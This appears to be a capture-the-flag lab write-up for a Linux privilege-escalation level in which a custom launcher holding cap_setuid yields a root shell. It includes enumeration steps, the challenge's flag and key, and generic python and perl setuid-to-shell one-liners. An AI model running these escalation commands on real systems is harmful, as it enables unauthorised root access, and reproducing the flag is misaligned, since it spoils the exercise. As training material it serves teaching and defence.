# L03 · Act I · Privilege Escalation — Powers Without the Bit

**MITRE tag:** T1548 — Abuse Elevation Control Mechanism: Linux file capabilities  
**Challenge type:** Linux file capability abuse (cap_setuid)  
**Flag:** `bl_f980789eff831adbc13565904b0f5b67`  
**SSH:** `pe-capabilities@204.168.229.209 -p 2224`

---

## Challenge brief

> *"No SUID flag in sight, yet one file carries a kernel capability it never needed. A single capability can be the whole escape. This same model returns in the container tracks."*

A binary on the box has been granted `cap_setuid` — the capability to change its own UID to any value, including root. The SUID bit is not set (standard `ls -l` looks clean). Find the binary, understand what it does, and use it to read a root-only file. Write the value to `/tmp/.pe-cap-proof` and run `verify`.

---

## The correct approach

**Step 1 — Run the capabilities sweep.**

The SUID sweep (`find -perm -4000`) misses capabilities entirely — they are stored in extended attributes, not in the inode permission bits. The separate sweep is:

```bash
getcap -r / 2>/dev/null
```

Any binary with `cap_setuid`, `cap_dac_override`, or `cap_sys_admin` is a candidate.

**Step 2 — Investigate the binary before exploiting.**

Apply the same checklist as L01. Ask:
- Is it in the package manager? (`apk info --who-owns`)
- What does it do? (try running it, check `--help`, check `strings`)
- Does it have a config directory?

For `svc-run`: not in the package manager, no help output, `strings` reveals `runner.c` as the source file and `execvp`/`execve` calls — it is a custom program that takes a path as argument and executes it.

**Step 3 — Identify the exploit model.**

There are two distinct capability exploit models:

| Model | How it works | Example |
|---|---|---|
| Interpreter with `cap_setuid` | You call `setuid(0)` yourself in a script | `python3-cap -c 'import os; os.setuid(0); os.system("/bin/sh")'` |
| Runner with `cap_setuid` | The binary calls `setuid(0)` internally, then execs your program | `/usr/local/bin/svc-run /bin/sh` |

`svc-run` is the second model. It uses its capability to become root, then execs whatever program you pass it. You do not call `setuid(0)` yourself — the runner does it.

**Step 4 — Execute.**

```bash
/usr/local/bin/svc-run /bin/sh
id
cat /root/.pe-cap-key > /tmp/.pe-cap-proof
verify
```

Total commands: about 8.

---

## Enumeration log

### Step 1 — Capabilities sweep

```bash
getcap -r / 2>/dev/null
```

**Result:**
```
/usr/local/bin/svc-run cap_setuid=ep
```

**Conclusion:** One binary, one capability. `cap_setuid=ep` — `e` (effective, active immediately) and `p` (permitted). Not in the stock set. This is the target.

---

### Step 2 — Investigate the binary

```bash
apk info --who-owns /usr/local/bin/svc-run 2>/dev/null
```

**Result:** (nothing)

**Conclusion:** Not installed via package manager — dropped manually, same pattern as `backup` in L01.

```bash
/usr/local/bin/svc-run --help 2>&1
```

**Result:** (nothing)

**Conclusion:** No built-in help. Need to dig into the binary itself.

```bash
/usr/local/bin/svc-run
```

**Result:** Returns immediately to prompt with no output.

**Conclusion:** Either needs arguments, or the config is missing. Since there's no `/etc/svc-run/` either, it takes arguments.

```bash
strings /usr/local/bin/svc-run | grep -E "^/|\.sh|usage|help|run|exec|arg|error|script"
```

**Key results:**
```
/dev/null
/usr/local/bin:/bin:/usr/bin
argc
argv
execve
execvp
runner.c
```

**Conclusion:** The source file is `runner.c`. It uses `execvp`/`execve` to run another program. It accepts arguments (`argc`/`argv`). This is a program launcher — it takes a path and execs it.

---

### Step 3 — Test whether it sets UID before exec

```bash
/usr/local/bin/svc-run /bin/sh
```

**Result:** Shell prompt changed from `$` to `#` (Alpine root prompt).

```bash
id
```

**Result:** `uid=0(root) gid=1000(operator) groups=1000(operator)`

**Conclusion:** `uid=0` confirmed. The binary called `setuid(0)` using its `cap_setuid` before exec. The GID remains `operator` (group UID was not changed — only `setuid` was called, not `setgid`), but UID 0 is all the kernel checks for file access.

---

### Step 4 — Read the key and submit

```bash
ls -la /root/
```

**Result:** `/root/.pe-cap-key` (rw-------, owned root)

```bash
cat /root/.pe-cap-key
```

**Result:** `f0e4b225b9e1fd50edf34433ea7804de`

```bash
cat /root/.pe-cap-key > /tmp/.pe-cap-proof
verify
```

**Result:**
```
Level solved: pe-capabilities
Your flag: bl_f980789eff831adbc13565904b0f5b67
```

---

## What the vulnerability was

`svc-run` is a custom service launcher. Its job is to start system processes that need root-level access but should not be launched directly as root from an init script. The developer granted it `cap_setuid` so it could become root before starting those processes.

The design flaw: it accepts any program path as an argument. There is no whitelist of allowed programs, no check that the caller is a trusted user, no verification that the target binary is a known service. Any user on the box can call `svc-run /bin/sh` and get a root shell.

The correct design would have been one of:
- Hard-code the service path inside the binary (no argument accepted at all)
- Maintain a whitelist and reject anything not on it
- Use a different mechanism that does not give arbitrary exec-as-root

### Why `cap_setuid` is worse than it looks

`cap_setuid` is often treated as a "limited" alternative to SUID — you are giving a binary the ability to change UIDs, but nothing else. The assumption is that a tightly-scoped binary with `cap_setuid` is safer than a full SUID root binary.

That is only true if the binary cannot be told to exec arbitrary code. Any interpreter or launcher with `cap_setuid` is functionally equivalent to a SUID shell:
- Interpreter (python, perl, ruby) — the attacker calls `setuid(0)` themselves in the script
- Launcher (like `svc-run`) — the binary calls `setuid(0)` and then execs the attacker's program

### Why this level is different from L01 and L02

| Level | Mechanism | Kernel feature | Visible in `ls -l`? |
|---|---|---|---|
| L01 (SUID backup) | SUID bit | Effective UID set on exec by kernel | Yes — shows `s` in owner execute slot |
| L02 (sudo gawk) | Sudoers policy | Sudo grants root shell to the process | Via `sudo -l` only |
| L03 (cap svc-run) | File capability | Process calls `setuid(0)` itself using capability | No — `ls -l` looks normal |

The SUID sweep (`find -perm -4000`) would have missed `svc-run` completely. Only `getcap -r /` reveals it. On a real engagement, all three sweeps are mandatory.

---

## Carryover findings

None.

---

## Dead ends

None this session. The binary investigation was methodical and led directly to the exploit path.

---

## Command reference

```bash
# Capabilities sweep — separate from the SUID sweep
getcap -r / 2>/dev/null

# Check a specific binary's capabilities
getcap /usr/local/bin/svc-run

# Check if binary is from the package manager
apk info --who-owns /usr/local/bin/svc-run 2>/dev/null

# Understand what the binary does
strings /usr/local/bin/svc-run | grep -E "^/|exec|run|argc|\.sh"

# Exploit: runner model (binary calls setuid(0) internally, then execs your program)
/usr/local/bin/svc-run /bin/sh

# Exploit: interpreter model (you call setuid(0) yourself — for python, perl, etc.)
/path/to/python-with-cap -c 'import os; os.setuid(0); os.system("/bin/sh")'

# perl equivalent
perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/sh";'

# Confirm root
id
# look for uid=0 — note gid may still be original user if only setuid was called

# Read root-only key and submit
cat /root/.pe-cap-key > /tmp/.pe-cap-proof
verify
```